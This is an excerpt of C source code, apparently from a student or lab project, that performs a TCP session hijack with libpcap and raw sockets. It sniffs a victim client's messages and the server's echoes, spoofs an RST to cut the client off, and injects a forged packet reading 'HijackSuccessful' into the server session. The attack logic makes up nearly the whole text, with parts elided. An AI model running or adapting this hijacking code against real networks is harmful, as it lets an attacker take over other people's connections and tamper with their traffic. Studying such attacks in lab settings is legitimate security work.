...
//Declaring Future Functions
	...
	void find_client_msg(u_char *, const struct pcap_pkthdr *, const u_char *);
	void find_echo_msg(u_char *, const struct pcap_pkthdr *, const u_char *);
...
//1.1 - be in the same network-link as the client or the host (we assume we know the Client)
	...
	data_client_global = malloc(1000*sizeof(char));
	data_server_global = malloc(1000*sizeof(char));
...
//1.3 - wait for the Syn-Ack from server
	//Filter Expression set up for SYN+ACK
    	...
    	bytes[2] = (ip >> 16) & 0xFF;
    	bytes[3] = (ip >> 24) & 0xFF;
		char* strip13 = malloc(100*sizeof(char)); 
		sprintf(strip13,"tcp && src %d.%d.%d.%d", bytes[0],bytes[1], bytes[2], bytes[3]);
		char filter_exp_2[] = "                                                       ";
		strncpy(filter_exp_2, strip13, strlen(strip13));
		puts(filter_exp_2);
	//----------------------------------------------------------------------------------------
	...
	//--------------------------------------------------------------------------------------------------------
//2.1 - find_echo process
//Client provides a msg
	char* strip211 = malloc(100*sizeof(char));
	sprintf(strip211,"dst %d.%d.%d.%d && src %s && tcp && tcp-push != 0" , bytes[0], bytes[1], bytes[2], bytes[3], victim_ip_source);//Good source, good destination and PSH flag on for "file-exchange"	
	char filter_exp_attempt_login[] = "                                                   ";
	strncpy(filter_exp_attempt_login, strip211, strlen(strip211));
	ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
    if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
	...
	printf("Device %s is opened. Begin sniffing for MSG_ATTEMPT from Victim...\n", dev_name);
	...
	//Put the device in sniff loop
	pcap_loop(handle , -1 , find_client_msg, NULL);
	pcap_close(handle);
	print_tcp_ip_hdr(iph_client_global,tcph_client_global);
//System echo the msg
	char* strip212 = malloc(100*sizeof(char));
	sprintf(strip212,"src %d.%d.%d.%d && dst %s && tcp-push != 0" , bytes[0], bytes[1], bytes[2], bytes[3], victim_ip_source);//Good source, good destination and PSH flag on for "file-exchange"
	char filter_exp_password[] = "                                                   ";
	strncpy(filter_exp_password, strip212, strlen(strip212));
	ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
    if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
	...
	printf("\nDevice %s is opened. Begin sniffing for a ECHO_MSG from our Server...\n", dev_name);
	...
	pcap_loop(handle , 1000 , find_echo_msg, NULL);
	pcap_close(handle);
//Reset the client if data is the same, if not we restart the find_echo process
	puts(data_client_global);
	puts(data_server_global);
	printf("\n");
	msg_equal = strcmp(data_client_global, data_server_global);
	if(msg_equal == 0) {
		send_rst(iph_server_global, tcph_server_global);
	}else{
		puts("Message received is different from message sent");
		//Create a while over the CLIENT_MSG && ECHO_MSG to attend to wait for a good correspondance
	}
//Start communication with server
send_msg(iph_server_global,tcph_server_global);
...
void find_client_msg(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer){
	int size = header->len;
	...
	//Check if there's CLIENT_MSG being made and keep login in the global variable login
	//[We've checked with the PSH flag in the filter]
	//--------
	printf("We have captured a CLIENT_MSG from our victim\n");
    fflush(stdout);    
    ++total;
	switch (iph->protocol) //Check the Protocol and do accordingly...
	{
	...
	memcpy(iph_client_global,iph, iphdrlen);
	memcpy(tcph_client_global,tcph, sizeof(struct tcphdr));
	memcpy(data_client_global, data_s, strlen(data_s));
	pcap_breakloop(handle);
}
void find_echo_msg(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *buffer){
	int size = header->len;
	//Get the IP Header part of this packet
	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
    unsigned short iphdrlen;
    ...
    //Get the TCP Header
    struct tcphdr *tcph=(struct tcphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
    //check if it's an echo_msg_answer
	//[On a fait cela en utilisant la flag PHS] 
	// get data
	char *dbegin = (char *)(tcph) + 4 * tcph->doff;
  	char *dend = (char *)(iph) + ntohs(iph->tot_len);
  	char *data_s = malloc(dend - dbegin + 1);
  	...
  	data_s[dend - dbegin] = '\0';
	//-----------------------------	
	printf("We have captured a MSG_ECHO from the server\n");
    fflush(stdout);    
    ++total;
	switch (iph->protocol) //Check the Protocol and do accordingly...
	{
	...
	memcpy(iph_server_global,iph, iphdrlen);
	memcpy(tcph_server_global,tcph, sizeof(struct tcphdr));
	memcpy(data_server_global, data_s, strlen(data_s));
	pcap_breakloop(handle);
}
void send_msg(struct iphdr *srv_iphd, struct tcphdr *srv_tcphd){
	//socket
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
    ...
    char data_string[] = "HijackSuccessful";
    memset(packet, 0, 65536);
